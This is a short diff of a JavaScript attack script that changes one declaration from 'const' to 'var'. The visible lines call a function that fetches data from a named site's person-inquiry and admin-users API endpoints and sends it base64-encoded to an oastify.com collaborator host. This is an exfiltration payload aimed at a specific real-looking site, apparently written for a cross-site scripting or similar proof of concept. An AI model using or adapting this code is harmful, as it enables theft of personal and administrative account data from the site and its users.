@@ -21,7 +21,7 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
         .catch(error => console.error('Error in fetching or encoding:', error));
 }
 
-const targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
+var targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
 
 fetchEncodeAndSend('https://my.daryakenar.ir/api/Gates/1/inquires/person', targetUrlBase);
 fetchEncodeAndSend('https://my.daryakenar.ir/api/Admin/Users', targetUrlBase);
